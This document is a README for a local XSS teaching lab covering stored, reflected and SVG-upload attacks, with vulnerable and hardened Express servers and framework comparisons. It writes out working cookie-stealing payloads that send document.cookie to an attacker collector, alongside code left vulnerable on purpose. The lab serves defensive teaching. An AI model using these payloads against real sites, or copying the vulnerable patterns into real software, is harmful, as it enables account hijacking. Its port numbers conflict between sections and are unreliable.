# XSS Attack Demonstration Lab

## Overview

Cross-Site Scripting (XSS) is a class of injection attack where untrusted data is interpreted as executable code by a victim's browser. Unlike SQL injection, which targets the database, XSS targets the document context — the HTML, JavaScript, and cookie environment that the browser assembles when it renders a page. A successful XSS attack lets an attacker run JavaScript in the victim's browser session, read cookies, hijack accounts, or perform actions on behalf of the victim.

This lab covers three distinct XSS variants that differ in **persistence mechanism**, **delivery vector**, and **attack surface**:

| Variant | Persistence | Delivery | Attack surface |
|---|---|---|---|
| Stored XSS | Payload saved to server | Automatic on page load | Client-side rendering (`innerHTML`) |
| Reflected XSS | None — URL only | Phishing link | Server-side HTML interpolation |
| SVG Upload XSS | File on disk | User opens raw file URL | File-serving policy (not frontend code) |

The SVG Upload demo is intentionally built with clean frontend code — no `innerHTML`, no reflected parameters — to illustrate that XSS is not always a frontend developer mistake. A perfectly written React or vanilla JS application can still be vulnerable if the server serves user-uploaded SVG files without policy headers.

---

## Port Reference

### Attack 1 — Stored XSS (NovaCRM)

| Port | Role | File | npm script |
|------|------|------|------------|
| 3001 | Vulnerable victim | `stored/victim-server.js` | `npm run victim` |
| 3002 | Attacker collector | `stored/attacker-server.js` | `npm run attacker` |
| 3003 | Protected victim | `stored/victim-server-protected.js` | `npm run victim-protected` |

### Attack 2 — Reflected XSS (ShopNest)

| Port | Role | File | npm script |
|------|------|------|------------|
| 3004 | Vulnerable victim | `reflected/victim-server.js` | `npm run victim` |
| 3005 | Attacker collector | `reflected/attacker-server.js` | `npm run attacker` |
| 3006 | Protected victim | `reflected/victim-server-protected.js` | `npm run victim-protected` |

### Attack 3 — SVG Upload XSS (ConnectHub)

| Port | Role | File | npm script |
|------|------|------|------------|
| 3007 | Vulnerable victim | `svg-upload/victim-server.js` | `npm run victim` |
| 3008 | Attacker collector | `svg-upload/attacker-server.js` | `npm run attacker` |
| 3009 | Protected victim | `svg-upload/victim-server-protected.js` | `npm run victim-protected` |

---

## Attack 1: Stored XSS — NovaCRM Support Ticket Portal

### What It Is

Stored XSS is the most dangerous variant. The attacker's payload is saved to the server — in a database, file, or in-memory store — and delivered to every user who views the affected page. No further action from the attacker is required after the initial submission.

This pattern is common in support ticket systems, comment sections, forum posts, CMS platforms, and any application that stores user-generated content and renders it later. Real-world incidents have affected platforms from MySpace (the Samy worm, 2005) to modern SaaS helpdesks where agent dashboards render ticket bodies as HTML.

### How to Run

1. Open two terminals.
2. Terminal 1: `cd demo-attacked/xss/stored && npm run victim`
3. Terminal 2: `cd demo-attacked/xss/stored && npm run attacker`
4. Open `http://localhost:3001/admin` first — this sets the `agent_session` cookie.
5. Open `http://localhost:3002` in a separate window — attacker dashboard.
6. Open `http://localhost:3001` in a third tab — customer portal.
7. In the customer portal, submit a new ticket. Use these exact values:
   - Name: `Attacker`
   - Subject: `Having trouble logging in`
   - Message: `<img src="x" onerror="new Image().src='http://localhost:3002/steal?c='+encodeURIComponent(document.cookie)">`
8. The ticket appears in the **Recent Community Tickets** feed on the customer portal (same tab).
9. The `onerror` handler fires when the feed re-renders. Watch the cookie arrive on the attacker dashboard.

> **Note:** The admin dashboard (`/admin`) already uses `textContent` for ticket messages — a partial fix. The primary vulnerable render is the community ticket feed on `victim.html`.

### Vulnerable Code — Exact Lines

**`stored/victim.html`**

Line ~264 — `meta.innerHTML` rendered `ticket.name` as HTML (now fixed; was a second injection point):

```js
meta.innerHTML = `<span class="name">${ticket.name}</span>...`;
//                                    ^^^^^^^^^^^^ attacker-controlled, parsed as HTML
```

Line ~279 — `message.innerHTML` renders the full message body as HTML:

```js
message.innerHTML = ticket.message;
// ticket.message came from req.body.message with zero sanitization.
// The browser parses this as HTML. Any tag, any event handler, executes.
```

**`stored/victim-server.js`**

Line ~55 — Cookie set without HttpOnly, making it readable by JavaScript:

```js
res.cookie('agent_session', '...', { path: '/', httpOnly: false })
// httpOnly: false means document.cookie includes this token.
// The XSS payload reads it and exfiltrates it to the attacker server.
```

Line ~67 — No sanitization before storing:

```js
const ticket = { name, email, subject, message }; // raw body values, no cleaning
tickets.unshift(ticket);
```

### Why These Lines Are Dangerous

When `innerHTML` receives a string containing `<img onerror>`, the browser constructs a real `HTMLImageElement`, sets its `src`, the `src` fails (no resource at `"x"`), and the browser fires `onerror` as a genuine DOM event — with full JavaScript privileges in the page's origin.

The `encodeURIComponent(document.cookie)` runs in the document context of `localhost:3001`, which holds `agent_session` (set when `/admin` was visited earlier in the same browser). The `new Image().src` technique sends a GET request to the attacker server without triggering a CORS preflight. This is not a browser bug — it is the browser working exactly as designed.

### Payload Variants

1. **`<img src="x" onerror="...">`** — Works even when `<script>` tags are filtered by a WAF or sanitizer that only blocks script elements.
2. **`<svg onload="...">`** — SVG elements fire `onload` without needing a `src` attribute.
3. **`<body onpageshow="...">`** — Fires when the page is shown or restored from the back-forward cache.

### The Fix — Exact Lines

**`stored/victim-protected.html`**

```js
message.textContent = ticket.message;
// textContent assigns the string as a text node — never parsed as HTML.
// <img onerror="..."> is displayed as the literal characters < i m g ... >
// The browser never constructs an HTMLImageElement. No event fires. No execution.
```

**`stored/victim-server-protected.js`**

Cookie fix:

```js
res.cookie('agent_session', '...', { path: '/', httpOnly: true })
// httpOnly: true — document.cookie in JavaScript never includes this cookie.
// The XSS payload runs, document.cookie returns '', attacker gets nothing useful.
```

Sanitization at ingestion:

```js
const sanitizeText = (str) => String(str).replace(/<[^>]*>/g, '').trim();
const ticket = {
  name: sanitizeText(name),
  message: sanitizeText(message),
  // ...
};
// Strips HTML tags before storage. Defense-in-depth: even if innerHTML is used
// accidentally in a future code change, the stored data contains no tags.
```

CSP header:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
// Blocks scripts from external origins and inline scripts with src=.
// Does NOT block onerror/onload event handlers alone — those require 'unsafe-inline' removal.
// CSP is the last layer, not the primary fix.
```

### Edge Cases and What Still Fails

- **CSP alone is not enough:** `onerror` handlers are inline event attributes. Standard CSP does not block them without `'unsafe-inline'` explicitly denied AND a nonce-based policy.
- **Sanitizing only the message misses the name field:** Both `ticket.name` and `ticket.message` were renderable via `innerHTML`. Auditors often check only obvious free-text fields.
- **Sanitizing at read vs. write:** Encoding at write and using `textContent` at render avoids double-encoding bugs.
- **DOMPurify for rich text:** If the app needs to allow some HTML (bold, links), use DOMPurify's allowlist approach. Never write your own allowlist logic.

---

## Attack 2: Reflected XSS — ShopNest Search Page

### What It Is

Reflected XSS delivers the payload through a URL parameter. The server echoes the parameter value directly into the HTML response before the browser parses it. The script is baked into the server's HTTP response bytes — it is not injected by JavaScript after page load.

The attack requires social engineering: the victim must click a crafted link (typically embedded in a phishing email). The payload does not persist — only the victim who clicks the link is affected.

### How to Run

1. Terminal 1: `cd demo-attacked/xss/reflected && npm run victim`
2. Terminal 2: `cd demo-attacked/xss/reflected && npm run attacker`
3. Open `http://localhost:3003` — note the `shopper_session` cookie in the yellow banner.
4. Open `http://localhost:3004` — attacker dashboard.
5. In the attacker dashboard: type any product name, pick a template, click "Generate Phishing Email".
6. Click "View Your Results →" in the generated email preview.
7. You land on `/search?q=<payload>` on the victim server.
8. The cookie appears on the attacker dashboard within 1–2 seconds.

**Manual URL (Script Tag variant):**

```
http://localhost:3003/search?q=<script>new Image().src='http://localhost:3004/steal?c='+encodeURIComponent(document.cookie)</script>
```

**Note on URL encoding:** When you paste this URL into a browser address bar, the browser encodes `<` as `%3C` and `>` as `%3E`. Express automatically URL-decodes `req.query.q`, returning the original `<script>` tag. This is standard HTTP behavior, not a bypass.

### Vulnerable Code — Exact Lines

**`reflected/victim-server.js`**

Line ~71–77 — The raw query parameter is read directly:

```js
const q = req.query.q || '';
// q is now a raw attacker-controlled string with no processing.
```

Line ~92 — Reflected into the HTML title tag:

```js
<title>ShopNest — Search: ${q}</title>
// If q = '<script>alert(1)</script>', the browser's HTML parser executes it.
```

Line ~224 — Reflected into a visible heading:

```js
<h2>Search results for: ${q}</h2>
// Same issue — two separate injection points in the same response.
```

Line ~31–40 — Cookie without HttpOnly:

```js
res.setHeader('Set-Cookie', 'shopper_session=ShopperJane_t0k3n_ABC456; Path=/')
// No HttpOnly attribute. document.cookie includes shopper_session.
```

### Why These Lines Are Dangerous

Server-side template interpolation with unencoded user input is identical in effect to `innerHTML` on the client — but worse, because it happens before the browser has any chance to apply client-side defenses. The browser receives what it believes is server-authored HTML and parses it top-to-bottom. When it hits the `<script>` tag, it executes the contents unconditionally.

### The Fix — Exact Lines

**`reflected/victim-server-protected.js`** (port 3008)

```js
function htmlEncode(str) {
  return String(str).replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])
  );
}
// '<script>' becomes '&lt;script&gt;' — displayed as text, never parsed as a tag.

const rawQ = req.query.q || '';
const q = htmlEncode(rawQ); // encode first, use only encoded value below

<title>ShopNest — Search: ${q}</title>
// Browser renders encoded entities as literal text in the title bar. No execution.
```

### Edge Cases and What Still Fails

- **Context matters:** `htmlEncode` is correct for HTML body and attribute contexts. Values reflected inside a `<script>` block or CSS `url()` need different encoding rules.
- **Double encoding:** Encode once at the output boundary only.
- **URL attribute context:** `href="${q}"` requires URL encoding, not HTML encoding. `javascript:alert(1)` is not neutralised by `htmlEncode`.
- **Browser XSS Auditors:** Chrome's built-in Reflected XSS filter was removed in Chrome 78 (2019). Do not rely on it.

---

## Attack 3: SVG Upload XSS — ConnectHub Profile Avatar

### What It Is

The frontend HTML is 100% clean — no `innerHTML`, no reflected parameters. The vulnerability is the server's **file-serving policy**. SVG is a full XML+JavaScript runtime. When served directly as a URL (not embedded in `<img>`), the browser renders it as a document with script execution in the same origin as the serving domain.

### How to Run

1. Terminal 1: `cd demo-attacked/xss/svg-upload && npm run victim`
2. Terminal 2: `cd demo-attacked/xss/svg-upload && npm run attacker`
3. Open `http://localhost:3006` — attacker dashboard. Click "⬇ Download payload.svg".
4. Open `http://localhost:3005` — ConnectHub.
5. Upload `payload.svg` as your profile avatar via the upload form.
6. Your profile card appears in the community grid with a teal-colored avatar (looks normal).
7. Click "View Profile →" on your profile card. A modal opens.
8. Click "🔍 View Full Photo". The raw SVG URL opens in a new tab.
9. The script inside the SVG fires. Cookie appears on the attacker dashboard.

**Why the `<img>` tag is safe:** The community grid shows avatars via `<img src="...">`. Browsers sandbox SVG scripts inside `<img>` — they never execute. Scripts run only when the SVG URL is opened as a standalone tab.

### Vulnerable Code — Exact Lines

**`svg-upload/victim-server.js`**

Cookie without HttpOnly:

```js
res.setHeader('Set-Cookie', 'member_session=MemberSarah_t0k3n_DEF012; Path=/')
```

Multer accepts all file types:

```js
const upload = multer({ storage, limits: { fileSize: 5 * 1024 * 1024 } });
// No fileFilter — any file type accepted, including .svg files.
```

No file content inspection:

```js
app.post('/api/upload', upload.single('avatar'), (req, res) => {
  // File stored immediately. An SVG with <script> is stored as-is.
```

Uploads served with no policy headers:

```js
app.use('/uploads', express.static(UPLOADS_DIR));
// For .svg: Content-Type: image/svg+xml — no Content-Disposition, no CSP.
```

**`svg-upload/victim.html`** — the `window.open` call:

```js
window.open(profile.avatarUrl, '_blank')
// Opening the SVG URL directly removes the <img> sandbox. Scripts run.
```

### Why These Lines Are Dangerous

An SVG file is a valid XML document with a `<script>` element defined in the SVG spec. Browsers execute SVG scripts when rendered as a top-level document but NOT when loaded via `<img>`. The server assigns `localhost:3005` as the origin. The script runs with full access to `document.cookie` for that origin.

### The Fix — Exact Lines

**`svg-upload/victim-server-protected.js`** (port 3007)

**Layer 1** — Extension and MIME whitelist:

```js
function rasterOnlyFilter(req, file, cb) {
  if (!ALLOWED_EXTENSIONS.has(ext) || !ALLOWED_MIMETYPES.has(file.mimetype)) {
    return cb(new Error('Only JPG, PNG, GIF, and WebP images are allowed.'));
  }
}
// Blocks honest SVG uploads. NOT sufficient alone — attackers rename payload.svg to payload.jpg.
```

**Layer 2** — Magic bytes:

```js
function matchesMagicBytes(buffer) {
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) return true; // JPEG
  // PNG, GIF, WebP checks...
}
// Reads actual first bytes — renamed SVG fails because bytes start with <?xml or <svg.
```

**Layer 2b** — Content sniff:

```js
function containsExecutableMarkup(buffer) {
  const head = buffer.slice(0, 4096).toString('utf8').toLowerCase();
  return head.includes('<?xml') || head.includes('<svg') || head.includes('<script');
}
```

**Layer 3** — Sharp re-encoding:

```js
await sharp(filePath).rotate().jpeg({ quality: 85 }).toFile(outputPath);
fs.unlinkSync(filePath); // delete original
// Sharp decodes pixel data and writes a brand-new JPEG from scratch.
// EXIF, comments, and polyglot payloads are destroyed.
```

**Layer 4** — Safe file serving:

```js
app.use('/uploads', function (req, res, next) {
  res.setHeader('Content-Disposition', 'attachment');
  res.setHeader('Content-Security-Policy', "default-src 'none'");
  next();
}, express.static(UPLOADS_DIR));
```

### Edge Cases and What Still Fails

- **`<object>` and `<embed>` are NOT sandboxed like `<img>`:** Audit all elements that load user-uploaded files.
- **Extension whitelist bypassed by polyglot files:** Valid JPEG with script in EXIF passes magic bytes. Sharp re-encoding is the reliable defense.
- **Content-Disposition: attachment is browser-dependent:** Users can sometimes bypass via "Open in new tab". CSP provides a second layer.
- **Separate cookieless domain is the strongest architectural defense:** Serve avatars from a dedicated asset domain with no `Set-Cookie` responses.
- **X-Content-Type-Options: nosniff:** Prevents MIME-sniffing away from the declared Content-Type.

---

## Running All Demos Simultaneously

All 9 servers use different ports and can run at the same time for side-by-side comparison.

| Command | Port | Demo |
|---------|------|------|
| `cd stored && npm run victim` | 3001 | Stored — vulnerable |
| `cd stored && npm run attacker` | 3002 | Stored — collector |
| `cd stored && npm run victim-protected` | 3003 | Stored — protected |
| `cd reflected && npm run victim` | 3004 | Reflected — vulnerable |
| `cd reflected && npm run attacker` | 3005 | Reflected — collector |
| `cd reflected && npm run victim-protected` | 3006 | Reflected — protected |
| `cd svg-upload && npm run victim` | 3007 | SVG — vulnerable |
| `cd svg-upload && npm run attacker` | 3008 | SVG — collector |
| `cd svg-upload && npm run victim-protected` | 3009 | SVG — protected |

Each demo is self-contained. Attacker collectors (3002, 3005, 3008) can run alongside all victim servers simultaneously.

---

## Defense Summary Table

| Attack Type | Vulnerable Line | Fix | Residual Risk |
|---|---|---|---|
| Stored XSS — innerHTML | `victim.html:279` | `textContent` | None if applied consistently |
| Stored XSS — name field | `victim.html:264` | Safe DOM construction | None |
| Stored XSS — cookie | `victim-server.js:55` | `httpOnly: true` | Script still runs, just can't read cookie |
| Stored XSS — input | `victim-server.js:67` | `sanitizeText()` | Encoding at render is still required |
| Reflected XSS — SSR | `victim-server.js:92,224` | `htmlEncode(q)` | Only for HTML context |
| Reflected XSS — cookie | `victim-server.js:31` | `httpOnly: true` | Same as above |
| SVG XSS — upload | `victim-server.js:78` | `rasterOnlyFilter` | Spoofable by magic bytes |
| SVG XSS — magic bytes | `victim-server.js` (missing) | `matchesMagicBytes()` | Spoofable by polyglot |
| SVG XSS — polyglot | `victim-server.js` (missing) | Sharp re-encoding | Requires Sharp installed |
| SVG XSS — serving | `victim-server.js:142` | `Content-Disposition: attachment` | User can bypass in some browsers |
| SVG XSS — serving (CSP) | `victim-server.js:142` | `CSP: default-src 'none'` | Best server-side defense |
| SVG XSS — architecture | N/A | Separate cookieless CDN domain | Eliminates cookie theft entirely |

---

## This Demo in Real Frameworks

The vanilla JS patterns here map directly to production framework code. The vulnerability is identical — only the syntax differs.

---

### Stored XSS — client-side rendering

Applies to: **Pure SPA** (React CRA/Vite, Angular CLI, Vue CLI) and **Modern Hybrid client components** (Next.js Client Components, Nuxt client-side, SvelteKit client).

The root cause is `innerHTML`. Every framework has an escape hatch that reaches it.

**This demo** (`stored/victim.html` line 279):
```js
message.innerHTML = ticket.message  // ⚠️ raw DB content injected into DOM
```

**React** — Pure SPA or Next.js/Nuxt Client Component:
```jsx
// ⚠️ Byte-for-byte equivalent to innerHTML = ticket.message
<div dangerouslySetInnerHTML={{ __html: ticket.message }} />

// ✅ Safe — React escapes text by default, no API needed
<div>{ticket.message}</div>
```

**Angular** — Pure SPA or Angular Universal client-side:
```html
<!-- ⚠️ [innerHTML] binding is equivalent to innerHTML -->
<div [innerHTML]="ticket.message"></div>

<!-- ⚠️ Explicitly bypassing Angular's sanitizer — worst case -->
<!-- Component: this.safe = this.sanitizer.bypassSecurityTrustHtml(ticket.message) -->
<div [innerHTML]="safe"></div>

<!-- ✅ Safe — text interpolation escapes HTML -->
<div>{{ ticket.message }}</div>
```

**Vue** — Pure SPA or Nuxt 3 client component:
```html
<!-- ⚠️ v-html is equivalent to innerHTML -->
<div v-html="ticket.message"></div>

<!-- ✅ Safe — mustache interpolation escapes HTML -->
<div>{{ ticket.message }}</div>
```

**Key point:** React, Angular, and Vue all escape text interpolation by default. The vulnerability only appears when the developer explicitly opts into raw HTML rendering (`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`). These escape hatches exist for legitimate cases (markdown rendering, rich-text editors) but must only be used with sanitized input.

---

### Reflected XSS — server-side rendering

Applies to: **SSR frameworks** (Next.js pages router, Next.js App Router server components, Angular Universal, Nuxt 3 server components, Express+EJS/Handlebars, Django, Laravel, Rails).

The root cause is an unencoded request parameter interpolated into server-rendered HTML.

**This demo** (`reflected/victim-server.js` lines 92, 224):
```js
const q = req.query.q           // raw, unencoded
res.send(`<h2>Results for: ${q}</h2>`)  // ⚠️ SSR injection
```

**Next.js — pages router** (`getServerSideProps`):
```jsx
export async function getServerSideProps({ query }) {
  return { props: { q: query.q } }  // raw — passed straight through
}
export default function SearchPage({ q }) {
  // ⚠️ Injected into SSR output — same attack as the demo
  return <h2 dangerouslySetInnerHTML={{ __html: `Results for: ${q}` }} />
  // ✅ Safe — React escapes {q} automatically
  // return <h2>Results for: {q}</h2>
}
```

**Next.js — App Router** (Server Component, runs on server):
```tsx
// app/search/page.tsx
export default function SearchPage({ searchParams }: { searchParams: { q: string } }) {
  // ⚠️ Same injection, different syntax
  return <h2 dangerouslySetInnerHTML={{ __html: `Results for: ${searchParams.q}` }} />
  // ✅ Safe
  // return <h2>Results for: {searchParams.q}</h2>
}
```

**Angular Universal** (SSR — server-side render pass):
```html
<!-- ⚠️ [innerHTML] with unencoded server-passed value -->
<h2 [innerHTML]="'Results for: ' + q"></h2>

<!-- ✅ Safe — text interpolation -->
<h2>Results for: {{ q }}</h2>
```

**Django / Jinja2**:
```html
{# ⚠️ |safe filter disables auto-escaping — direct equivalent of ${q} #}
<h2>Results for: {{ q|safe }}</h2>

{# ✅ Safe — Django auto-escapes by default #}
<h2>Results for: {{ q }}</h2>
```

**Laravel / Blade**:
```blade
{{-- ⚠️ {!! !!} renders raw HTML — equivalent to ${q} --}}
<h2>Results for: {!! $q !!}</h2>

{{-- ✅ Safe — {{ }} auto-escapes --}}
<h2>Results for: {{ $q }}</h2>
```

---

### SVG Upload XSS — server policy (framework-independent)

This attack has nothing to do with the frontend framework. The vulnerability is entirely server-side:

1. Server accepts SVG as a valid upload type
2. Server serves it without `Content-Disposition: attachment` or CSP

It does not matter whether the frontend is React, Angular, Vue, Next.js, or plain HTML. An Angular or Next.js app with the same upload endpoint and the same static file serving policy is equally vulnerable. The fix (Sharp re-encoding, `Content-Disposition`, separate CDN domain) lives on the server and is framework-agnostic.
